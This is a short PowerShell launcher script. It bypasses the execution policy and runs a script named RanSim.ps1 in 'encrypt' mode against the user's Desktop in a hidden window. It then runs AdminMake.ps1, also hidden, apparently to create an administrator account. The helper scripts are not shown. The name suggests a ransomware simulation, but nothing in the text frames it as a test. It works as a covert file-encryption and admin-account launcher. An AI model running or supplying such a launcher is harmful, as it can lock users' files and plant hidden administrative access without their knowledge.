Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

$AccPath = [Environment]::GetFolderPath("Favorites")
cd $AccPath
$Target = [Environment]::GetFolderPath("Desktop")

Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
./RanSim.ps1 -Mode encrypt -TargetPath $Target -WindowStyle Hidden -NoNewWindow

Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
./AdminMake.ps1 -WindowStyle Hidden
